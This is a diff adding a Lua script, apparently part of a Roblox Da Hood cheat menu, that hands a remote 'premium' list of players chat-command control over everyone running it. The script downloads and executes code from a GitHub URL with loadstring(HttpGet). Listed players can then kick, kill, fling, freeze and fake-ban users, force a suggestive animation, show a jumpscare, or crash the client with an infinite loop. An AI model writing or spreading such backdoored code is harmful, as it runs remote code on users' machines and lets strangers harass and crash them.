@@ -1,0 +1,389 @@
+spawn(function()
+    local PremiumNames = loadstring(game:HttpGet('https://raw.githubusercontent.com/sayfst/sayfstUi/main/Da%20hood%20menu%20premium%20list', true))()
+
+    local IsAMod = false
+    
+    --[[
+    if args[2] == prefix2 then
+        bring()
+    else
+        findPlayer(args[2], function(plr)
+            if plr.Name == NormalUser.Name then
+                bring()
+            end
+        end)
+    end
+    ]]
+    
+    function FlashGui()
+        local FlashGui = Instance.new('ScreenGui', game.CoreGui)
+        local Frame = Instance.new('Frame', FlashGui)
+        
+        FlashGui.Name = '[FlashGuiPremium]'
+    
+        Frame.Name = '[FlashFrame]'
+        Frame.Visible = false
+        Frame.Position = UDim2.new(0, 0, -1, 0)
+        Frame.Size = UDim2.new(3, 0, 3, 0)
+        Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    end
+    
+    local OldFlash = game.CoreGui:FindFirstChild('[FlashGuiPremium]')
+    
+    if OldFlash then
+        OldFlash:Destroy()
+        wait(.1)
+        FlashGui()
+    else
+        FlashGui()
+    end
+    
+    local Humanoid = game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid")
+    local AnimationsFolder
+    if not workspace:FindFirstChild('AnimationsFolder') then
+        local AnimationsFolder = Instance.new("Folder", workspace)
+        AnimationsFolder.Name = 'AnimationsFolder'
+    end
+    
+    local PrayAni = Instance.new('Animation', AnimationsFolder)
+    PrayAni.AnimationId = 'rbxassetid://3487719500'
+    local Pray = Humanoid:LoadAnimation(PrayAni)
+    
+    
+    function findPlayer(name, callback)
+        local callback = callback or function()end
+        for i,v in pairs(game.Players:GetChildren()) do
+            if string.find(v.Name, name) or string.find(v.Name, name) then
+                pcall(callback, v)
+            end
+        end
+    end
+    function Cmd(cmd, plr)
+        local prefix = '!'
+        local prefix2 = ' '
+        local Emoji = '⭐'
+        local args = cmd:split(' ')
+        local Premium = game.Players:FindFirstChild(plr.Name)
+        local NormalUser = game:GetService('Players').LocalPlayer
+    
+        if IsAMod == false then
+    
+            -- Bring command
+            if args[1] == prefix .. 'bring' then
+                function bring()
+                    NormalUser.Character.HumanoidRootPart.CFrame = Premium.Character.HumanoidRootPart.CFrame
+                end
+                if args[2] == prefix2 then
+                    bring()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            bring()
+                        end
+                    end)
+                end
+            end
+    
+            -- Kill command
+            if args[1] == prefix .. 'kill' then
+                function kill()
+                    NormalUser.Character.Humanoid.Health = 0
+                end
+                if args[2] == prefix2 then
+                    kill()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            kill()
+                        end
+                    end)
+                end
+            end
+    
+            -- Refresh command
+            if args[1] == prefix .. 'refresh' then
+                function refresh()
+                    game.Players.LocalPlayer.Character["HumanoidRootPart"]:Destroy() game.Players.LocalPlayer.Character["RightHand"]:Destroy() game.Players.LocalPlayer.Character["LeftLowerArm"]:Destroy() game.Players.LocalPlayer.Character["RightLowerArm"]:Destroy() game.Players.LocalPlayer.Character["LeftUpperArm"]:Destroy() game.Players.LocalPlayer.Character["RightUpperArm"]:Destroy() game.Players.LocalPlayer.Character["LowerTorso"]:Destroy() game.Players.LocalPlayer.Character["LeftLowerLeg"]:Destroy() game.Players.LocalPlayer.Character["LeftUpperLeg"]:Destroy() game.Players.LocalPlayer.Character["LeftFoot"]:Destroy() game.Players.LocalPlayer.Character["RightFoot"]:Destroy() game.Players.LocalPlayer.Character["RightLowerLeg"]:Destroy() game.Players.LocalPlayer.Character["RightUpperLeg"]:Destroy() game.Players.LocalPlayer.Character["UpperTorso"]:Destroy() game.Players.LocalPlayer.Character["LeftHand"]:Destroy() game.Players.LocalPlayer.Character["Head"]:Destroy()
+                end
+                if args[2] == prefix2 then
+                    refresh()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            refresh()
+                        end
+                    end)
+                end
+            end
+            -- Fling command
+            if args[1] == prefix .. 'fling' then
+                function fling()
+                    local power = 50000
+                    NormalUser.Character.HumanoidRootPart.Velocity = Vector3.new(power, power, power)
+                end
+                if args[2] == prefix2 then
+                    fling()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            fling()
+                        end
+                    end)
+                end
+            end
+            -- Pray command
+            if args[1] == prefix .. 'pray' then
+                function pray()
+                    Pray:Play()
+                end
+                if args[2] == prefix2 then
+                    pray()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            pray()
+                        end
+                    end)
+                end
+            end
+    
+            -- Flash command
+            if args[1] == prefix .. 'flash' then
+                function flash()
+                    game.CoreGui:FindFirstChild('[FlashGuiPremium]')['[FlashFrame]'].Visible = true
+                end
+                if args[2] == prefix2 then
+                    flash()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            flash()
+                        end
+                    end)
+                end
+            end
+    
+            -- UnFlash command
+            if args[1] == prefix .. 'unflash' then
+                function unflash()
+                    game.CoreGui:FindFirstChild('[FlashGuiPremium]')['[FlashFrame]'].Visible = false
+                end
+                if args[2] == prefix2 then
+                    unflash()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            unflash()
+                        end
+                    end)
+                end
+            end
+    
+            -- Kick command
+            if args[1] == prefix .. 'kick' then
+                function kick()
+                    NormalUser:Kick('Kicked by: ' .. Premium.Name)
+                end
+                if args[2] == prefix2 then
+                    kick()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            kick()
+                        end
+                    end)
+                end
+            end
+    
+            -- Benx command
+            if args[1] == prefix .. 'benx' then
+                function benx()
+                    local away = 0.5
+                    getgenv().BenxRunning = true
+                    local reversing = true
+    
+                    spawn(function()
+                        repeat
+                            if reversing == true then
+                                away = away - 0.1
+                            else
+                                away = away + 0.1
+                            end
+                            if away >=2 then
+                                reversing = true
+                            elseif away <=0.5 then
+                                reversing = false
+                            end
+                            wait()
+                        until getgenv().BenxRunning == false
+                    end)
+                    function LoopFunction()
+                        NormalUser.Character.HumanoidRootPart.CFrame = Premium.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3 + away)
+    
+                        
+                    end
+    
+                    getgenv().BenxRunning2 = game:GetService('RunService').Heartbeat:Connect(LoopFunction)
+    
+                    local AnimationIdd = game:GetService("ReplicatedStorage").ClientAnimations.Crouching.AnimationId
+    
+                    local Humanoid = game.Players.LocalPlayer.Character:WaitForChild('Humanoid')
+                    local Benx = Instance.new('Animation', workspace)
+                    Benx.AnimationId = AnimationIdd
+                    
+                    BenxAni = Humanoid:LoadAnimation(Benx)
+                    BenxAni:Play()
+                    BenxAni.Looped = true
+                    repeat wait() BenxAni:Play() until getgenv().BenxRunning == false
+                    BenxAni:Stop()
+    
+    
+                end
+                if args[2] == prefix2 then
+                    benx()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            benx()
+                        end
+                    end)
+                end
+            end
+            if args[1] == prefix .. 'jumpscare' then
+                function jumpsacre()
+                    local ScreenGui = Instance.new("ScreenGui") local ImageLabel = Instance.new("ImageLabel") local Frame = Instance.new("Frame") ScreenGui.Parent = game.CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling ImageLabel.Parent = ScreenGui ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5) ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0) ImageLabel.Position = UDim2.new(0.4996382, 0, 0.49999994, 0) ImageLabel.Size = UDim2.new(1, 0, 1, 0) ImageLabel.Visible = false ImageLabel.Image = "rbxassetid://8859140616" Frame.Parent = ImageLabel Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) Frame.Position = UDim2.new(-0.433429807, 0, -0.704358041, 0) Frame.Size = UDim2.new(9, 9, 9, 9) local function WSPIPDV_fake_script() local script = Instance.new('LocalScript', Frame) repeat wait() until game:IsLoaded() script.Parent.Parent.Visible = false wait(1) local Sound = Instance.new("Sound", workspace) Sound.SoundId = 'rbxassetid://5657950552' Sound.Volume = 10 Sound:Play() script.Parent.Parent.Visible = true wait(.4) for i = 1,30 do script.Parent.Parent.Image = 'rbxassetid://8859140616' script.Parent.Visible = not script.Parent.Visible script.Parent.Parent.Rotation = 25 wait() script.Parent.Parent.Rotation = -25 script.Parent.Visible = not script.Parent.Visible wait() script.Parent.Parent.Rotation = 0 script.Parent.Visible = not script.Parent.Visible wait() end Sound:Destroy() script.Parent.Visible = false script.Parent.Parent.Visible = false end coroutine.wrap(WSPIPDV_fake_script)()
+                end
+                if args[2] == prefix2 then
+                    jumpsacre()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            jumpsacre()
+                        end
+                    end)
+                end
+            end
+            if args[1] == prefix .. 'unbenx' then
+                function unbenx()
+                    getgenv().BenxRunning = false
+                    getgenv().BenxRunning2:Disconnect()
+                end
+                if args[2] == prefix2 then
+                    unbenx()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            unbenx()
+                        end
+                    end)
+                end
+            end
+            if args[1] == prefix .. 'crash' then
+                function crash()
+                    while true do end
+                end
+                if args[2] == prefix2 then
+                    crash()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            crash()
+                        end
+                    end)
+                end
+            end
+            if args[1] == prefix .. 'thaw' then
+                function unfreeze()
+                    NormalUser.Character.HumanoidRootPart.Anchored = false
+                end
+                if args[2] == prefix2 then
+                    unfreeze()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            unfreeze()
+                        end
+                    end)
+                end
+            end
+            if args[1] == prefix .. 'freeze' then
+                function freeze()
+                    NormalUser.Character.HumanoidRootPart.Anchored = true
+                end
+                if args[2] == prefix2 then
+                    freeze()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            freeze()
+                        end
+                    end)
+                end
+            end
+            if args[1] == '/e test' then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Yeah, yeah!', "All")
+            end
+
+            if args[1] == prefix .. 'ban' then
+                function ban()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 1
+                    wait(.3)
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        game:GetService("RunService").Stepped:Connect(function()
+                            v.Transparency = 1
+                        end)
+                    end
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.JAILLOCATION1.CFrame
+                    wait(.1)
+                    game.Players.LocalPlayer:Kick('PERMA-BAN')
+                end
+                if args[1] == prefix2 then
+                    ban()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            ban()
+                        end
+                    end)
+                end
+            end
+        end
+    end
+    
+    
+    function VerifyAdmins()
+        local PremiumNames = loadstring(game:HttpGet('https://raw.githubusercontent.com/sayfst/sayfstUi/main/Da%20hood%20menu%20premium%20list', true))()
+        for i,v in pairs(PremiumNames) do
+            if game.Players:FindFirstChild(v) then
+                if game.Players:FindFirstChild(v) ~= game.Players.LocalPlayer then
+                    local plr = game.Players:FindFirstChild(v)
+                    pcall(function()
+                        local StarName = plr.Character.Humanoid.DisplayName:split(']')
+                        if StarName[1] ~= '['..Emoji then
+                            plr.Character.Humanoid.DisplayName = '['..Emoji..']'..plr.Character.Humanoid.DisplayName
+                            plr.CharacterAdded:Connect(function()
+                                wait(1)
+                                plr.Character.Humanoid.DisplayName = '['..Emoji..']'..plr.Character.Humanoid.DisplayName
+                            end)
+                        end
+                    end);
+                    game.Players:FindFirstChild(v).Chatted:Connect(function(message)
+                        message = string.lower(message)
+    
+                        Cmd(message, plr)
+                    end)
+                else
+                    IsAMod = true
+                end
+            end
+        end
+    end
+    
+    VerifyAdmins()
+    game.Players.PlayerAdded:Connect(function(plr)
+        VerifyAdmins()
+    end)
+    wait(1)
+    
+    
+end)
